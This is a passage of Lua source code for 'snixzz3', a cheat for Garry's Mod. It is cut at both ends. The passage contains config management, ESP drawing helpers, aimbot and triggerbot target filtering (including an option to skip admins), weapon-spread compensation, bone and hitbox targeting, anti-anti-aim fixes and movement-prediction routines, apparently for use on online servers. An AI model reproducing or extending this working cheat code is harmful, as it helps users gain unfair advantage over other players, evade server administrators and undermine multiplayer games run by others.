		slider:SetWide( wide )
		slider:SetText( text )
		slider:SetMin( min )
		slider:SetMax( max )
		slider:SetDecimals( Dec )
		slider:SetValue( snixzz.Vars[var] ) 
		slider.OnValueChanged = function( p, v ) 
			snixzz.Vars[var] = v 
		end
		
	elseif dtype == "Label" then
		dtype = "DLabel"
		local text, x, y = oText, oBool, xPos
		local label = G.vgui.Create( dtype, parent )
		label:SetPos( x, y )
		label:SetText( text )
		label:SizeToContents()
		label:SetTextColor( G.color_white )
		
	end
	
end

function snixzz.ConfigExists( cfg )

	if G.file.Exists( snixzz.DataFolder .. "/configs/" .. cfg .. ".txt", "DATA" ) then
		
		return true
		
	else
	
		return false
		
	end
end

function snixzz.SaveConfig( cfg )

	local save = {}
	save.Vars = snixzz.Vars
	save.Bools = snixzz.Bools
	save.Binds = snixzz.Binds
	save.Entities = snixzz.Entities
	save.Friends = snixzz.Friends
	cfg = G.string.gsub( cfg, " ", "_" )
	
	if !snixzz.ConfigExists( cfg ) then
	
		G.table.insert( snixzz.Configs, cfg )
		G.file.Write( snixzz.DataFolder .. "/configs/" .. cfg .. ".txt", G.util.TableToJSON( save ) )
		snixzz.Chat( snixzz.Colors.Green, "Created config " .. cfg .. "!" )
		
		snixzz.LoadConfig( cfg )
		
	else
		
		snixzz.Chat( snixzz.Colors.Red, "Config " .. cfg .. " already exists!" )
		
	end
	
end

function snixzz.UpdateConfig()

	local cfg = snixzz.CurrentConfig

	if cfg != "default" then
	
		if snixzz.ConfigExists( cfg ) then
			
			local save = {}
			save.Vars = snixzz.Vars
			save.Bools = snixzz.Bools
			save.Binds = snixzz.Binds
			save.Entities = snixzz.Entities
			save.Friends = snixzz.Friends
			G.file.Write( snixzz.DataFolder .. "/configs/" .. cfg .. ".txt", G.util.TableToJSON( save ) )
			snixzz.Chat( snixzz.Colors.Green, "Updated '" .. cfg .. "' with current settings" )
			
		else
			
			snixzz.Chat( snixzz.Colors.Red, "Config " .. cfg .. " wasn't found!" )
			
		end
		
	else
	
		snixzz.Chat( snixzz.Colors.Red, "You can't modify 'default' config!" )
		
	end	
	
end
	
function snixzz.LoadConfig( cfg, bool )

	cfg = G.string.lower( cfg )
	
	if snixzz.CurrentConfig != cfg then
	
		if snixzz.ConfigExists( cfg ) then
		
			local ToRead = G.util.JSONToTable( G.file.Read( snixzz.DataFolder .. "/configs/" .. cfg .. ".txt", "DATA" ) )
			snixzz.Vars = ToRead.Vars
			snixzz.Bools = ToRead.Bools
			snixzz.Binds = ToRead.Binds
			snixzz.Entities = ToRead.Entities
			snixzz.Friends = ToRead.Friends
			snixzz.CurrentConfig = cfg
			
			if !bool then -- ignore chat on first load
				snixzz.Chat( snixzz.Colors.Green, "Loaded config '" .. cfg .. "'" )
			end
			
		else
		
			snixzz.LoadConfig( "default" )
			snixzz.CurrentConfig = "default"
			snixzz.Chat( Color( 255, 0, 0 ), "Invalid config file! '" .. cfg .. "' Loading default!" )
			
		end
		
	else
	
		snixzz.Chat( snixzz.Colors.Red, "Config " .. cfg .. " is already loaded!" )
		
	end
	
end

function snixzz.DeleteConfig( cfg )

	cfg = G.string.lower( cfg )
	
	if cfg != snixzz.DefaultConfig then
		
		if G.file.Exists( snixzz.DataFolder .. "/configs/" .. cfg .. ".txt", "DATA" ) then
			
			G.file.Delete( snixzz.DataFolder .. "/configs/" .. cfg .. ".txt" )
			snixzz.Chat( snixzz.Colors["DarkRed"], "Deleted config '" .. cfg .. "'" )
			
		else
		
			snixzz.Chat( Color( 255, 0, 0 ), "Unable to find config " .. cfg "!" )
			
		end
		
	else
	
		snixzz.Chat( snixzz.Colors["Red"], "You cannot delete the default config!" )
		
	end
end

function snixzz.RenameConfig( Old, New )

	New = G.string.gsub( New, " ", "_" )
	New = G.string.lower( New )
	
	if Old != snixzz.DefaultConfig then
	
		if !snixzz.ConfigExists( New ) then
		
			local OldConfig = G.file.Read( snixzz.DataFolder .. "/configs/" .. Old .. ".txt", "DATA" )
			
			if snixzz.ConfigExists( Old ) then
			
				G.file.Delete( snixzz.DataFolder .. "/configs/" .. Old .. ".txt", "DATA" )
				
			end
			
			G.file.Write( snixzz.DataFolder .. "/configs/" .. New .. ".txt", OldConfig )
			snixzz.Chat( snixzz.Colors["DarkRed"], "Renamed " .. Old .. " to " .. New .. "." )
			
		else
		
			snixzz.Chat( Color( 255, 0, 0 ), "Config " .. New .. " already exists! Pick a different name." )
			
		end
		
	else
	
		snixzz.Chat( snixzz.Colors["Red"], "You cannot rename the default config!" )
		
	end
	
end

function snixzz.SetDefaultConfig( cfg )

	if cfg != snixzz.DefaultConfig then
	
		if snixzz.ConfigExists( cfg ) then
		
			snixzz.DefaultConfig = cfg 
			G.file.Write( snixzz.DataFolder .. "/defaultconfig.txt", snixzz.DefaultConfig )
			snixzz.Chat( Color( 255, 255, 0 ), "Set '" .. cfg .. "' as the default config." )
			
		else
		
			snixzz.Chat( Color( 255, 0, 0 ), "'" .. cfg .. "' is not a valid config!" )
			
		end
		
	else
	
		snixzz.Chat( Color( 255, 0, 0 ), "'" .. cfg .. "' is already the default config!" )
		
	end
	
end

function snixzz.BindKey( Bind, Key, bool ) 

	-- Console binding, ignore checks.
	if bool then
	
		if G[Key] then
		
			if snixzz.Binds[Bind] then
	
				snixzz.Binds[Bind] = G[Key]
				snixzz.Chat( snixzz.Colors.Green, "Bound " .. Bind .. " to " .. Key .. "!" )
				
			else
				
				snixzz.Chat( snixzz.Colors.Red, "'" .. Bind .. "' is an unknown command!" )
				
			end
			
		else
			
			snixzz.Chat( snixzz.Colors.Red, "'" .. Key .. "' is an unknown key!" )
			
		end
		
		return
		
	end

	if snixzz.Binds[Bind] then 

		for _, v in G.pairs( snixzz.Keys ) do 
										
			if Key == v.Name then 

				snixzz.Binds[Bind] = v.Key
				snixzz.Chat( snixzz.Colors.Green, "Bound " .. Bind .. " to " .. Key .. "!" )
				
			end 
			
		end  
		
	end 
	
end

-- TODO: use this somewhere
function snixzz.Unbind( Bind )

	if snixzz.Binds[Bind] then
	
		snixzz.Binds[Bind] = KEY_NONE
		snixzz.Chat( snixzz.Colors.Green, "Unbound " .. Bind .. "!" )
		
	else	
	
		snixzz.Chat( snixzz.Colors.Red, "Failed to find command '" .. Bind .. "'" )
		
	end
	
end 

function snixzz.GetConfigs() 

	local files = G.file.Find( snixzz.DataFolder .. "/configs/*.txt", "DATA") 
	
	for k, v in G.pairs( files ) do 
		
		files[k] = G.string.Replace( v, ".txt", "" ) 
	
	end  
	
	return files 
end 

-- Update all configs to work with the newest version of the cheat.
snixzz.UpdatedCfgs = {}
function snixzz.UpdateAllConfigs() -- Update outdated configs to the new version.
	
	for _, cfg in G.next, snixzz.Configs do
		
		if snixzz.ConfigExists( cfg ) then
		
			local json = G.util.JSONToTable( G.file.Read( snixzz.DataFolder .. "/configs/" .. cfg .. ".txt", "DATA" ) )

			-- Check Binds
			for k, v in G.next, snixzz.Binds do
				
				if json.Binds[k] == nil then
					
					json.Binds[k] = v
				
					snixzz.Message( snixzz.Colors.White, "Added bind '" .. k .. "' to config '" .. cfg .. "'" )
					
					if !snixzz.UpdatedCfgs[cfg] then snixzz.UpdatedCfgs[cfg] = true end
					
				end
				
			end
			
			-- Check Bools
			for k, v in G.next, snixzz.Bools do
				
				if json.Bools[k] == nil then
					
					json.Bools[k] = v
				
					snixzz.Message( snixzz.Colors.White, "Added bool '" .. k .. "' to config '" .. cfg .. "'" )
					
					if !snixzz.UpdatedCfgs[cfg] then snixzz.UpdatedCfgs[cfg] = true end
					
				end
				
			end
			
			-- Check Vars
			for k, v in G.next, snixzz.Vars do
				
				if json.Vars[k] == nil then
									
					json.Vars[k] = v
					
					snixzz.Message( snixzz.Colors.White, "Added var '" .. k .. "' to config '" .. cfg .. "'" )
					
					if !snixzz.UpdatedCfgs[cfg] then snixzz.UpdatedCfgs[cfg] = true end

				end
				
			end
			
			if snixzz.UpdatedCfgs[cfg] then
			
				G.file.Write( snixzz.DataFolder .. "/configs/" .. cfg .. ".txt", G.util.TableToJSON( json ) )
				
				snixzz.Chat( snixzz.Colors.Green, "Successfully updated config '" .. cfg .. "' with the newest settings." )
				
			end
			
		end
		
	end
	
end

/*

	filesystem 

*/

snixzz.DataFiles = {
	"defaultconfig.txt",
	"logs/Main.txt",
	"logs/AntiCheat.txt",
	"logs/Detour.txt",
	"logs/Debug.txt",
}
snixzz.DataFolders = {
	"configs",
	"logs",
}

function snixzz.FileSystem()
	
	if !G.file.IsDir( snixzz.DataFolder, "DATA" ) then
		
		G.file.CreateDir( snixzz.DataFolder )
		snixzz.Message( Color( 0, 255, 0 ), "Creating '" .. snixzz.DataFolder .. "' main data folder." )
		
	end
	
	for k, v in G.next, snixzz.DataFolders do
		
		if !G.file.IsDir( snixzz.DataFolder .. "/" ..  v, "DATA" ) then
		
			G.file.CreateDir( snixzz.DataFolder .. "/" .. v )
			snixzz.Message( Color( 0, 255, 0 ), "Creating '" .. snixzz.DataFolder .. "/" .. v .. "' data folder." )
			
		end
		
	end

	for k, v in G.next, snixzz.DataFiles do
	
		if !G.file.Exists( snixzz.DataFolder .. "/" ..  v, "DATA" ) then
			
			G.file.Write( snixzz.DataFolder .. "/" .. v, G.Either( v == "defaultconfig.txt", snixzz.DefaultConfig, "=== snixzz3 ===\n\n" ) ) -- This is a cool function.
			
			snixzz.Message( Color( 0, 255, 0 ), "Creating '" .. snixzz.DataFolder .. "/" .. v .. "' data file." )
		
		end
		
	end
	
end

/*
	ESP	functions
*/

-- borrowed from snipwnage2's cheat with permission
function snixzz.GetBounds( v )

	local eyePos = v:EyeAngles()
	local min = v:OBBMins()
	local max = v:OBBMaxs()
	
	local corners = {
		
		G.Vector( min.x, min.y, min.z ),
		G.Vector( min.x, min.y, max.z ),
		G.Vector( min.x, max.y, min.z ),
		G.Vector( min.x, max.y, max.z ),
		G.Vector( max.x, min.y, min.z ),
		G.Vector( max.x, min.y, max.z ),
		G.Vector( max.x, max.y, min.z ),
		G.Vector( max.x, max.y, max.z ),
		
	}
	
	local minx = G.math.huge 
	local miny = G.math.huge 
	local maxx = -G.math.huge
	local maxy = -G.math.huge
	
	for _, corner in G.next, corners do
		
		local screen = v:LocalToWorld( corner ):ToScreen()
		minx = G.math.min( minx, screen.x )
		miny = G.math.min( miny, screen.y )
		maxx = G.math.max( maxx, screen.x )
		maxy = G.math.max( maxy, screen.y )
		
	end
	
	return minx, miny, maxx, maxy
end

-- Thanks gmod wiki!
function snixzz.DrawOutlinedBox( x, y, w, h, thickness, color )
	
	G.surface.SetDrawColor( color )
	
	for i = 0, thickness - 1 do
		
		G.surface.DrawOutlinedRect( x + i, y + i, w - i * 2, h - i * 2 )
	
	end
	
end

function snixzz.IsAdmin( v )

	if v:IsAdmin() then
		
		return true
		
	end
	
	if snixzz.AdminGroups[v:GetUserGroup()] then
		
		return true
		
	end
	
end

function snixzz.ShouldDraw( v )

	// better fps maybe
	local distance = v:GetPos():Distance( G.LocalPlayer():GetPos() )
	
	if snixzz.Vars["esp_distance"] != 0 && distance >= snixzz.Vars["esp_distance"] then
		
		return false
	
	end

	if !v:IsPlayer() or !v:Alive() or v == G["LocalPlayer"]() then
		
		return false
	
	end
		
	if ( v:Team() == TEAM_SPECTATOR or G.string.find( G.team.GetName( v:Team() ), "spectator" ) ) then
		
		return false
	
	end	
	
	if snixzz.Functions.IsDormant( v:EntIndex() ) then
		
		return false
	
	end
	
	return true	
end

/********************/
/*					*/
/* Aimbot functions */
/*					*/
/********************/
function snixzz.IsValid( v, Type )
	
	if !G.IsValid( v ) or v == G.LocalPlayer() then
		
		return false
		
	end
	
	if Type then
		
		if Type == "Aimbot" then
		
			if snixzz.IsProphunt && snixzz.Bools["misc_prophunt_finder"] then
				
				if v:IsPlayer() then
					
					if v:Team() == TEAM_SPECTATOR or v:Team() == TEAM_UNASSIGNED then return false end
					
					if v == LocalPlayer() then return false end -- Duh
					
				elseif snixzz.IsProp( v ) then
					
					local owner = v:GetOwner()
					
					if owner == LocalPlayer() then return false end
					
				end
				
				if LocalPlayer():GetClass() == "ph_prop" then
					
					return false
					
				end
				
				if !snixzz.IsProp( v ) && !v:IsPlayer() then
					
					return false
					
				end
				
				if v:IsPlayer() && v:Team() == TEAM_HUNTERS then
					
					return false
					
				end
			
			elseif snixzz.Vars["aim_target_type"] == "NPC" && !v:IsNPC() then
				
				return false
				
			elseif snixzz.Vars["aim_target_type"] == "Players" && !v:IsPlayer() then
				
				return false
				
			elseif snixzz.Vars["aim_target_type"] == "Both" && !v:IsPlayer() && !v:IsNPC() then
				
				return false
				
			end
		
		elseif Type == "Triggerbot" then
		
			if snixzz.Vars["misc_triggerbot_type"] == "NPC" && !v:IsNPC() then
				
				return false
				
			elseif snixzz.Vars["misc_triggerbot_type"] == "Players" && !v:IsPlayer() then
				
				return false
				
			elseif snixzz.Vars["misc_triggerbot_type"] == "Both" && !v:IsPlayer() && !v:IsNPC() then
				
				return false
				
			end
			
		elseif Type == "ESP" then
			
			if snixzz.IsProphunt && snixzz.Bools["misc_prophunt_finder"] then
				
				if v:IsPlayer() then
					
					if v:Team() == TEAM_SPECTATOR or v:Team() == TEAM_UNASSIGNED then return false end
					
					if v == LocalPlayer() then return false end -- Duh
					
				elseif snixzz.IsProp( v ) then
					
					local owner = v:GetOwner()
					
					if owner == LocalPlayer() then return false end
					
				end

				if !snixzz.IsProp( v ) && !v:IsPlayer() then
					
					return false
					
				end
				
				if v:IsPlayer() && !snixzz.IsProp( v ) && v:Team() == TEAM_PROPS then
					
					return false
					
				end
				
			elseif snixzz.Vars["esp_type"] == "NPC" && !v:IsNPC() then
				
				return false
				
			elseif snixzz.Vars["esp_type"] == "Players" && !v:IsPlayer() then
				
				return false
				
			elseif snixzz.Vars["esp_type"] == "Entities" && !snixzz.Entities[v:GetClass()] then
				
				return false
				
			elseif snixzz.Vars["esp_type"] == "All" && !snixzz.Entities[v:GetClass()] && !v:IsPlayer() && !v:IsNPC() then
				
				return false
				
			end
			
			local distance = v:GetPos():Distance( G.LocalPlayer():GetPos() )
	
			if snixzz.Vars["esp_render_distance"] != 0 && distance >= snixzz.Vars["esp_render_distance"] then
				
				return false
			
			end
			
		end
		
	end
		
	-- IsDormant check
	if snixzz["IsDormant"]( v:EntIndex() ) && !snixzz.IsProp( v ) then 
			
		return false
		
	end
	
	if Type == nil or Type != "ESP" then
	
		if v:GetMoveType() == 0 && !snixzz.IsProp( v ) then
			
			return false
			
		end

		// visible check
		if !snixzz.Bools["aim_ignorelos"] then
			
			if !snixzz.IsVisible( v, snixzz.GetPos( v ) ) then
				
				return false
		
			end
		
		end
		
		-- field of view
		if !snixzz.InFov( v ) then
				
			return false
			
		end
		
	end
	
	if snixzz.IsProphunt && snixzz.Bools["misc_prophunt_finder"] then
	
		if snixzz.IsProp( v ) && v:Health() < 0 then
			
			return false
		
		elseif v:IsPlayer() && !v:Alive() then
				
			return false
				
		end
		
	elseif v:IsNPC() then
		
		if v:Health() < 1 then
			
			return false
			
		end
		
	elseif v:IsPlayer() then
		
		if Type == nil or Type != "ESP" then
		
			-- ignore admins
			if snixzz.Bools["aim_ignoreadmins"] then
				
				if snixzz.IsAdmin( v ) then
					
					return false
				
				end
			
			end
			
			-- ignore friends
			if snixzz.Bools["aim_ignorefriends"] then
				
				if snixzz.Friends[v:Nick()] then
					
					return false
				
				end
			
			end
		
			-- Ignore bots
			if snixzz.Bools["aim_ignorebots"] && v:IsBot() then
				
				return false
			
			end
			
			if v:InVehicle() then 
			
				return false 
		
			end
			
			-- No noclip glitchers please
			if G.GetConVarNumber( "sbox_noclip" ) == 0 && v:GetMoveType() == MOVETYPE_NOCLIP then 
				
				return false 
			
			end
		
			-- Ignore Steam friends
			if snixzz.Bools["aim_ignoresteam"] then
				
				if v:GetFriendStatus() == "friend" then 
					
					return false 
				
				end
			
			end
			
			-- Friendly Fire
			if snixzz.Bools["aim_ignoreteam"] then
				
				if ( v:Team() == G.LocalPlayer():Team() ) then
					
					return false
			
				end
			
			end
			
			// ignore T buddies
			if snixzz.Bools["aim_ignoretraitors"] && snixzz.IsTTT then
				
				if ( G.LocalPlayer():IsTraitor() && v:IsTraitor() ) then
					
					return false
				
				end
			
			end
			
			// Target only traitors
			if snixzz.Bools["aim_onlytraitors"] && snixzz.IsTTT then
				
				if !snixzz.IsTraitor( v ) then
					
					return false
					
				end
				
			end
			
			
			// spawn protection
			local col = v:GetColor()
			
			if col.a < 255 then
			
				return false
			
			end
			
			if G.LocalPlayer():GetColor().a < 255 then
				
				return false
		
			end
			
		end
		
		if !v:Alive() then
				
			return false
				
		end
		
		-- Spectator check
		if v:GetMoveType() == MOVETYPE_OBSERVER or v:Team() == TEAM_SPECTATOR then 
			
			return false 
		
		end
		
	end

	return true
	
end


snixzz.Cones = {

	["HL2"] = {
		["weapon_pistol"] = G.Vector( 0.01, 0.01, 0.01 ),
		["weapon_smg1"] = G.Vector( 0.04362, 0.04362, 0.04362 ),
		["weapon_ar2"] = G.Vector( 0.02618, 0.02618, 0.02618 ),
		["weapon_shotgun"] = G.Vector( 0.08716, 0.08716, 0.08716 ),
	},
	
	["Normal"] = {}
	
}

local wepCone
snixzz.Predicting = false
function snixzz.GetCone( wep )

	if !G.IsValid( wep ) then
		
		return 0
	
	end
	
	snixzz.Predicting = true -- idea stolen from dismay, seeing if this does anything.

	if snixzz.Cones["HL2"][wep:GetClass()] != nil then
		
		snixzz.Predicting = false
		
		return snixzz.Cones.HL2[wep:GetClass()]
		
	end
	
	if snixzz.Cones.Normal[wep:GetClass()] != nil then
		
		snixzz.Predicting = false
		
		return snixzz.Cones.Normal[wep:GetClass()]
		
	end
	
	wepCone = wep.Cone
	
	if !wepCone then
		
		wepCone = wep.Primary && wep.Primary.Cone or 0
		
	end
	
	snixzz.Predicting = false
	
	return wepCone or 0
	
end
		
local spreadCone = G.Vector( 0, 0, 0 )
local getCone = G.Vector( 0, 0, 0 )
local punch
function snixzz.PredictSpread( cmd, ang )
	
	local wep = G.LocalPlayer():GetActiveWeapon() or NULL
	
	if !G.IsValid( wep ) then
		
		return ang
	
	end
	
	getCone = snixzz.GetCone( wep )
			
	if G.type( getCone ) == "number" then
		
		spreadCone = G.Vector( -getCone, -getCone, -getCone )
	
	elseif G.type( getCone ) == "Vector" then
			
		spreadCone = getCone * -1
		
	end
	
	if snixzz.Cones["HL2"][wep:GetClass()] != nil then
	
		punch = G.LocalPlayer():GetViewPunchAngles()
		
		ang = ang - punch
	
	end

	return snixzz.Functions.PredictSpread( cmd, ang, spreadCone )
end

snixzz.NPCModels = {

	["models/combine_scanner.mdl"] = "Scanner.Body",
	["models/hunter.mdl"] = "MiniStrider.body_joint",
	["models/combine_turrets/floor_turret.mdl"] = "Barrel",
	["models/dog.mdl"] = "Dog_Model.Eye",
	["models/antlion.mdl"] = "Antlion.Body_Bone",
	["models/antlion_guard.mdl"] = "Antlion_Guard.Body",
	["models/antlion_worker.mdl"] = "Antlion.Head_Bone",
	["models/zombie/fast_torso.mdl"] = "ValveBiped.HC_BodyCube",
	["models/zombie/fast.mdl"] = "ValveBiped.HC_BodyCube",
	["models/headcrabclassic.mdl"] = "HeadcrabClassic.SpineControl",
	["models/headcrabblack.mdl"] = "HCBlack.body",
	["models/headcrab.mdl"] = "HCFast.body",
	["models/zombie/poison.mdl"] = "ValveBiped.Headcrab_Cube1",
	["models/zombie/classic.mdl"] = "ValveBiped.HC_Body_Bone",
	["models/zombie/classic_torso.mdl"] = "ValveBiped.HC_Body_Bone",
	["models/zombie/zombie_soldier.mdl"] = "ValveBiped.HC_Body_Bone",
	["models/combine_strider.mdl"] = "Combine_Strider.Body_Bone",
	["models/lamarr.mdl"] = "HeadcrabClassic.SpineControl",
	["models/crow.mdl"] = Vector( 0, 0, 5 ),
	["models/pigeon.mdl"] = Vector( 0, 0, 5 ),
	["models/seagull.mdl"] = Vector( 0, 0, 6 ),

}

snixzz.Bones = {
	
	["Head"] = "ValveBiped.Bip01_Head1",
	["Neck"] = "ValveBiped.Bip01_Neck1",
	["Spine"] = "ValveBiped.Bip01_Spine",
	["Spine2"] = "ValveBiped.Bip01_Spine2",
	["Spine4"] =  "ValveBiped.Bip01_Spine4",
	["Pelvis"] = "ValveBiped.Bip01_Pelvis",
	["R Upperarm"] = "ValveBiped.Bip01_R_UpperArm",
	["R Forearm"] = "ValveBiped.Bip01_R_Forearm",
	["R Hand"] = "ValveBiped.Bip01_R_Hand",
	["L Upperarm"] = "ValveBiped.Bip01_L_UpperArm",
	["L Forearm"] = "ValveBiped.Bip01_L_Forearm",
	["L Hand"] = "ValveBiped.Bip01_L_Hand",
	["R Thigh"] = "ValveBiped.Bip01_R_Thigh",
	["R Calf"] = "ValveBiped.Bip01_R_Calf",
	["R Foot"] = "ValveBiped.Bip01_R_Foot",
	["R Toes"] = "ValveBiped.Bip01_R_Toe0",
	["L Thigh"] = "ValveBiped.Bip01_L_Thigh",
	["L Calf"] = "ValveBiped.Bip01_L_Calf",
	["L Foot"] = "ValveBiped.Bip01_L_Foot",
	["L Toes"] = "ValveBiped.Bip01_L_Toe0",
	
}

snixzz.Hitboxes = {

	["Head"] = 0,	
	["L Upperarm"] = 1,
	["L Forearm"] = 2,
	["L Hand"] = 3,
	["R Upperarm"] = 4,
	["R Forearm"] = 5,
	["R Hand"] = 6,
	["L Thigh"] = 7,
	["L Calf"] = 8,
	["F Foot"] = 9,
	["L Toe"] = 10,
	["R Thigh"] = 11,
	["R Calf"] = 12,
	["R Foot"] = 13,
	["R Toe"] = 14,
	["Pelvis"] = 15,
	["Spine"] = 16,
	
}

snixzz.Hitscans = {
	0, -- head
	16, -- spine
	4, -- r upper arm
	1, -- l upper arm
	5, -- r forearm
	2, -- l forearm
	6, -- r hand
	3, -- l hand
	15, -- pelvis
	11, -- r thigh
	7, -- l thigh
	12, -- r calf
	8, -- l calf
	13, -- r foot
	9, -- l foot
}

snixzz.Hitgroups = {
	[HITGROUP_HEAD] = "Head",
	[HITGROUP_CHEST] = "Chest",
	[HITGROUP_STOMACH] = "Stomach",
	[HITGROUP_LEFTARM] = "Left Arm",
	[HITGROUP_RIGHTARM] = "Right Arm",
	[HITGROUP_LEFTLEG] = "Left Leg",
	[HITGROUP_RIGHTLEG] = "Right Leg",
}

local Hitbox
local HitboxPos
local Bone
local BonePos
local Hitscan
local HitscanPos
local HitMin, HitMax
function snixzz.GetPos( v )
	
	if snixzz.IsProphunt && snixzz.Bools["misc_prophunt_finder"] && snixzz.IsProp( v ) then
		
		return v:LocalToWorld( v:OBBCenter() )
	
	elseif snixzz.Vars["aim_target_type"] == "NPC" or snixzz.Vars["aim_target_type"] == "Both" && v:IsNPC() then
		
		local special = snixzz.NPCModels[v:GetModel()]	
		
		if !special then	
			
			for k, v in G.next, snixzz.Bones do
				
				if v[1] == snixzz.Vars["aim_bone"] then
					
					special = v[2]
					
				end
				
			end
			
			special = special or "ValveBiped.Bip01_Head1"
			
		elseif type( special ) == "Vector" then
		
			return v:LocalToWorld( special )
		
		end
		
		local bone = v:LookupBone( special )
		
		if bone then
			
			local pos, ang = v:GetBonePosition( bone )
			
			return pos, ang
			
		end
		
	elseif snixzz.Vars["aim_target_type"] == "Players" or snixzz.Vars["aim_target_type"] == "Both" && v:IsPlayer() then
	
		if snixzz.Vars["aim_method"] == "Hitbox" then
		
			Hitbox = v:GetHitBoxBone( snixzz.Hitboxes[snixzz.Vars["aim_hitbox"]], 0 )	
			HitboxPos = v:GetBonePosition( Hitbox )
		
			local min, max = v:GetHitBoxBounds( snixzz.Hitboxes[snixzz.Vars["aim_hitbox"]], 0 )
			
			return HitboxPos + ( min + max ) / 2
			
		elseif snixzz.Vars["aim_method"] == "Bone" then
			
			Bone = snixzz.Bones[snixzz.Vars["aim_bone"]]
			BonePos = v:LookupBone( Bone )
			
			if BonePos then
				
				local pos, ang = v:GetBonePosition( BonePos )
				return pos, ang
			
			end
		
		elseif snixzz.Vars["aim_method"] == "Hitscan" then
			
			for k, e in G.next, snixzz.Hitscans do
			
				Hitscan = v:GetHitBoxBone( snixzz.Hitscans[k], 0 )

				if Hitscan != nil then
					
					HitscanPos = v:GetBonePosition( Hitscan )
					HitMin, HitMax = v:GetHitBoxBounds( snixzz.Hitscans[k], 0 )
					
					if snixzz.IsVisible( v, HitscanPos + ( HitMin + HitMax ) / 2 ) then
						
						snixzz.TargetBone = Hitscan

						return HitscanPos + ( HitMin + HitMax ) / 2
						
					end
					
				end
				
			end
		
		end		
		
	end

	return v:LocalToWorld( v:OBBCenter() )
end

-- thanks asutorea
function snixzz.CanFire()
	
	local wep = G.LocalPlayer():GetActiveWeapon()
	
	if snixzz.properCurTime == nil then return false end
	
	return G.IsValid( wep ) && !snixzz.BadWeapons[wep:GetClass()] && wep:GetActivity() != ACT_RELOAD && wep:GetNextPrimaryFire() < snixzz.properCurTime && G.LocalPlayer():Alive()
end

-- pAntiAnti Aim
function snixzz.FixAngle( v )

	local eyeAngles = _R.Entity.EyeAngles( v )
	
	if eyeAngles.p < -89 then
		
		_R.Entity.SetPoseParameter( v, "aim_pitch", eyeAngles.p + 180 )
		_R.Entity.InvalidateBoneCache( v )
	
	elseif eyeAngles.p > 89 then
	
		_R.Entity.SetPoseParameter( v, "aim_pitch", eyeAngles.p - 180 )
		_R.Entity.InvalidateBoneCache( v )
	
	end
	
end

function snixzz.OnScreen( v )
	
	local a, f = _R.Player.GetAimVector( G.LocalPlayer() ):Angle() - ( v:GetPos() - G.LocalPlayer():GetShootPos() ):Angle(), _R.Player.GetFOV( G.LocalPlayer() )     
	
	return ( G.math.NormalizeAngle( a.y ) < f + 2 && G.math.NormalizeAngle( a.p ) < f + 2 )
end

function snixzz.IsDormant( index )
	
	return snixzz.Functions.IsDormant( index )

end

function snixzz.FixMove( ucmd, aa )
	
	local fixAngle = G.Vector( ucmd:GetForwardMove(), ucmd:GetSideMove(), 0 )
	fixAngle = (( fixAngle:GetNormal() ):Angle() + ( ucmd:GetViewAngles() - G.Angle( 0, snixzz.Silent.y, 0 ) ) ):Forward() * fixAngle:Length()
	
	if aa then
		
		ucmd:SetForwardMove( fixAngle.x )
		ucmd:SetSideMove( fixAngle.y * -1 )
		
		return	
	end
	
	ucmd:SetForwardMove( fixAngle.x )
	ucmd:SetSideMove( fixAngle.y )
	
end

function snixzz.NormalizeAngles( ang )
	
	ang.p = G.math.NormalizeAngle( ang.p )
	ang.y = G.math.NormalizeAngle( ang.y )
	ang.r = 0
	
	return ang
	
end

local fov, my_FovAngs, targAng // fovangs
local fovang = {}
function snixzz.InFov( ply )

	fov = snixzz.Vars["aim_fov"] 
	
	if fov == 180 then 
	
		return true
		
	end
	
	my_FovAngs = LocalPlayer():GetAngles()

	targAng = ( snixzz.GetPos( ply ) - LocalPlayer():GetShootPos() ):Angle()
	
	fovang.y = math.abs( math.NormalizeAngle( my_FovAngs.y - targAng.y ) )
	fovang.p = math.abs( math.NormalizeAngle( my_FovAngs.p - targAng.p ) )
	
	if fovang.y > fov or fovang.p > fov then 
	
		return false 
		
	end
	
	return true
	
end

local smooth_Speed
local my_Angles
function snixzz.SmoothAngle( ang ) // idk what im doing

	smooth_Speed = snixzz.Vars["aim_smooth_speed"] / 10

	my_Angles = LocalPlayer():EyeAngles()
	
	my_Angles.p = math.Approach( my_Angles.p, ang.p, smooth_Speed )
	
	my_Angles.y = math.Approach( my_Angles.y, ang.y, smooth_Speed )
	
	my_Angles.r = 0
	
	ang = my_Angles
	
	return ang

end

snixzz.PredPositions = {}
local tbl = snixzz.PredPositions[v] or {}

function snixzz.GetPredictionPos( v, pos )
	
	tbl.pos = tbl.pos or pos or _R.Entity.GetPos( v )
	
	local realTime = G.RealTime()
	
	if tbl.realTime != realTime then
		
		tbl.realTime = realTime
		tbl.pos = pos or _R.Entity.GetPos( v )
		
	end	
	
	tbl.velocity = v:GetVelocity()	
	snixzz.PredPositions = tbl	
	
	return tbl.pos
end

snixzz.PredictionMethods = { "Velocity 0.0075", "Engine Velocity", "Classic", "Herpes", "ColdFire", "FapHack", "fr1kin", "Dismay", "Ampris", "Turbobot", "Faphack Old" }
snixzz.PredWeapons = {

	["weapon_crossbow"] = 3110,
	["weapon_frag"] = 3110,
	
}

local sv_gravity = G.GetConVar( "sv_gravity" )
local interp_ratio = G.GetConVar( "cl_interp_ratio" )
local updaterate = G.GetConVar( "cl_updaterate" )
local interp = G.GetConVar( "cl_interp" )
local emptyVec = Vector( 0, 0, 0 )
local tPos, lVelocity, tVelocity, tDistance, predTime, predWep, shootPos, ply_Frames, targ_Frames, time, ping

function snixzz.Prediction( Pos, v )

	predWep = G.LocalPlayer():GetActiveWeapon()
	lVelocity = _R.Entity.GetVelocity( G.LocalPlayer() )
	tVelocity = _R.Entity.GetVelocity( v )
	tPos = _R.Entity.GetPos( v )
	lPos = _R.Entity.GetPos( G.LocalPlayer() )
	tDistance = lPos:Distance( tPos )
	
	if G.IsValid( v ) && G.type( tVelocity ) == "Vector" && G.type( tPos ) == "Vector" then		

		if predWep && G.IsValid( predWep ) && snixzz.PredWeapons[predWep:GetClass()] then		
		
			predTime = tDistance / snixzz.PredWeapons[predWep:GetClass()]
			Pos = Pos + tVelocity * predTime	
			
		else		
		
			if snixzz.Vars["aim_prediction_method"] == "Velocity 0.0075" then
				
				Pos = Pos + lVelocity * 0.0075 + tVelocity * 0.0075
					
			elseif snixzz.Vars["aim_prediction_method"] == "Engine Velocity" then
				
				Pos = Pos + tVelocity * G.engine.TickInterval() - lVelocity * G.engine.TickInterval()
				
			elseif snixzz.Vars["aim_prediction_method"] == "Classic" then
			
				Pos = Pos + tVelocity / 45 - lVelocity / 45
			
			elseif snixzz.Vars["aim_prediction_method"] == "Herpes" then
			
